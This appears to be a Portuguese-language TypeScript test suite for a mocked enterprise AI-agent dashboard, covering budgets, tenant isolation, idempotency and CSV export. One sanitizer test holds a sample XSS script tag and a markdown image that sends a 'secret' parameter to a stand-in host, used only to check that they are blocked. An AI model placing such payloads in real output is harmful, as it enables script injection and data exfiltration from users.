import assert from "node:assert/strict";
import { describe, test } from "node:test";
import {
  generateOrganizationUsageCsv,
  MOCK_SESSION_ACTORS,
  resolvePlatformBackoffice,
  resolveTenantRouteAccess,
} from "../lib/mock-enterprise-data.ts";
import {
  createIdempotencyKey,
  registerIdempotentMutation,
  sanitizeAgentMessageContent,
} from "../lib/mock-security.ts";
import {
  computeBudgetStatus,
  deriveDashboardViewModel,
  getMockOrganizationBySlug,
  listMockOrganizations,
  roleCanDecideApprovals,
} from "../lib/mock-selectors.ts";

describe("LOC-WEB-001 — Modelo e transformações do frontend mockado (EP-10 sem 3D)", () => {
  test("WEB-MOCK-AC-01: expõe organizações mockadas e banner explícito de demonstração", () => {
    const orgs = listMockOrganizations();
    assert.equal(orgs.length, 2);
    assert.equal(orgs[0]?.slug, "aurora-industrial");
    assert.equal(orgs[1]?.slug, "vereda-logistica");

    const vm = deriveDashboardViewModel({ orgSlug: "aurora-industrial" });
    assert.equal(vm.isDemoEnvironment, true);
    assert.match(vm.demoBannerText, /DEMONSTRAÇÃO/i);
    assert.equal(vm.organization.displayName, "Aurora Industrial");
    assert.equal(vm.organization.tenantState, "ACTIVE");
    assert.equal(vm.organization.canDecideApprovals, true);
  });

  test("WEB-MOCK-AC-02: calcula métricas, filas, aprovações e alertas de orçamento (80% e 100%)", () => {
    assert.equal(computeBudgetStatus(500, 1000).alertLevel, "healthy");
    assert.equal(computeBudgetStatus(800, 1000).alertLevel, "warning_80");
    assert.equal(computeBudgetStatus(1000, 1000).alertLevel, "critical_100");
    assert.equal(computeBudgetStatus(0, 0).percentage, 0);

    const vm = deriveDashboardViewModel({
      orgSlug: "aurora-industrial",
      variant: "ready",
    });

    assert.equal(vm.metrics.totalFloors, 4);
    assert.equal(vm.metrics.totalAgents, 7);
    assert.equal(vm.metrics.executingAgents, 3);
    assert.equal(vm.metrics.awaitingApprovalAgents, 2);
    assert.equal(vm.metrics.activeTasksCount, 4);
    assert.equal(vm.metrics.pendingApprovalsCount, 2);
    assert.equal(vm.metrics.budgetAlertFloorsCount, 2);
    assert.equal(vm.metrics.totalBudget.spentBrl, 11000);
    assert.equal(vm.metrics.totalBudget.limitBrl, 15000);
    assert.equal(vm.metrics.totalBudget.percentage, 73);
  });

  test("WEB-MOCK-AC-03: ordena departamentos e filtra agentes por departamento e busca", () => {
    const vm = deriveDashboardViewModel({ orgSlug: "aurora-industrial" });
    assert.deepEqual(
      vm.floors.map((f) => f.floorNumber),
      [4, 3, 2, 1],
    );
    assert.equal(vm.selectedFloor?.id, "floor-fin-04");
    assert.equal(vm.filteredAgents.length, 2);

    const opsVm = deriveDashboardViewModel({
      orgSlug: "aurora-industrial",
      selectedFloorId: "floor-ops-02",
      agentQuery: "roteirização",
    });
    assert.equal(opsVm.selectedFloor?.floorNumber, 2);
    assert.equal(opsVm.filteredAgents.length, 1);
    assert.equal(opsVm.filteredAgents[0]?.code, "OPS-logistica");
  });

  test("WEB-MOCK-AC-04: estados determinísticos ready, loading, empty e error são representáveis", () => {
    const loadingVm = deriveDashboardViewModel({
      orgSlug: "aurora-industrial",
      variant: "loading",
    });
    assert.equal(loadingVm.variant, "loading");
    assert.equal(loadingVm.floors.length, 0);
    assert.equal(loadingVm.tasks.length, 0);
    assert.equal(loadingVm.errorDetails, null);

    const emptyVm = deriveDashboardViewModel({
      orgSlug: "aurora-industrial",
      variant: "empty",
    });
    assert.equal(emptyVm.variant, "empty");
    assert.equal(emptyVm.floors.length, 0);
    assert.equal(emptyVm.metrics.totalAgents, 0);
    assert.ok(emptyVm.emptyStateMessage && emptyVm.emptyStateMessage.length > 10);

    const errorVm = deriveDashboardViewModel({
      orgSlug: "aurora-industrial",
      variant: "error",
    });
    assert.equal(errorVm.variant, "error");
    assert.equal(errorVm.floors.length, 0);
    assert.ok(errorVm.errorDetails);
    assert.equal(errorVm.errorDetails.code, "TENANT_RUNTIME_UNAVAILABLE");
    assert.match(errorVm.errorDetails.correlationId, /^corr-demo-/);
  });

  test("respeita papel viewer e estado PROVISIONING na organização secundária e fallback seguro", () => {
    const veredaVm = deriveDashboardViewModel({ orgSlug: "vereda-logistica" });
    assert.equal(veredaVm.organization.isProvisioning, true);
    assert.equal(veredaVm.organization.canDecideApprovals, false);
    assert.equal(roleCanDecideApprovals("viewer"), false);
    assert.equal(roleCanDecideApprovals("org_admin"), true);

    const fallbackOrg = getMockOrganizationBySlug("slug-inexistente");
    assert.equal(fallbackOrg.slug, "aurora-industrial");
  });

  test("WEB-001 (mock): acessar /orgs/<slug-de-B> não pertencente à sessão retorna 404 sem vazar dados", () => {
    const marina = MOCK_SESSION_ACTORS[0] ?? null;
    const allowedRes = resolveTenantRouteAccess(marina, "aurora-industrial");
    assert.equal(allowedRes.allowed, true);
    assert.equal(allowedRes.httpStatus, 200);
    assert.equal(allowedRes.organization?.slug, "aurora-industrial");

    const forbiddenCrossTenant = resolveTenantRouteAccess(marina, "titan-defesa");
    assert.equal(forbiddenCrossTenant.allowed, false);
    assert.equal(forbiddenCrossTenant.httpStatus, 404);
    assert.equal(forbiddenCrossTenant.organization, null);

    const unauthRes = resolveTenantRouteAccess(null, "aurora-industrial");
    assert.equal(unauthRes.allowed, false);
    assert.equal(unauthRes.httpStatus, 401);
  });

  test("WEB-002 (mock): idempotency key bloqueia mutação repetida (duplo clique)", () => {
    const key = createIdempotencyKey("agt-fin-01", "lote-442", "approve");
    assert.equal(key, "idem-agt-fin-01:lote-442:approve");

    const firstAttempt = registerIdempotentMutation([], "agt-fin-01", "lote-442", "approve");
    assert.equal(firstAttempt.allowed, true);

    const secondAttempt = registerIdempotentMutation(
      firstAttempt.updatedKeys,
      "agt-fin-01",
      "lote-442",
      "approve",
    );
    assert.equal(secondAttempt.allowed, false);
    assert.equal(secondAttempt.idempotencyKey, firstAttempt.idempotencyKey);
  });

  test("WEB-003 (mock): exporta CSV de consumo consistente com token_usage das fixtures", () => {
    const csv = generateOrganizationUsageCsv("aurora-industrial");
    assert.match(
      csv,
      /^organizacao,departamento,modulo,agente,modelo,tokens_usados_mes,tokens_limite_mes,gasto_mensal_brl,orcamento_mensal_brl/m,
    );
    assert.match(
      csv,
      /"aurora-industrial","Finanças & Controladoria","MOD-FIN-CORE","Helena \(Conciliação\)"/,
    );
  });

  test("WEB-008 (mock): sanitiza payload XSS e bloqueia imagem remota automática em resposta de agente", () => {
    const malicious =
      "Parecer pronto.\n<script>alert('xss')</script>\n![tracker](https://evil.example/track.png?secret=1)";
    const result = sanitizeAgentMessageContent(malicious);

    assert.equal(result.blockedXssCount, 2);
    assert.deepEqual(result.blockedRemoteImages, ["https://evil.example/track.png?secret=1"]);
    assert.ok(
      result.safeSegments.some((s) => s.kind === "blocked_xss"),
      "Deve marcar o segmento XSS como bloqueado",
    );
    assert.ok(
      result.safeSegments.some((s) => s.kind === "blocked_remote_image"),
      "Deve reter imagem remota em placeholder sem carregá-la",
    );
  });

  test("WEB-009 (mock): usuário comum de tenant recebe 403 em /platform e platform_admin vê apenas metadados", () => {
    const tenantUser = MOCK_SESSION_ACTORS[0] ?? null;
    const denied = resolvePlatformBackoffice(tenantUser);
    assert.equal(denied.allowed, false);
    assert.equal(denied.httpStatus, 403);
    assert.equal(denied.tenants.length, 0);

    const platformAdmin = MOCK_SESSION_ACTORS[2] ?? null;
    const granted = resolvePlatformBackoffice(platformAdmin);
    assert.equal(granted.allowed, true);
    assert.equal(granted.httpStatus, 200);
    assert.equal(granted.tenants.length, 5);
    assert.equal(granted.dlqItems.length, 2);
  });
});
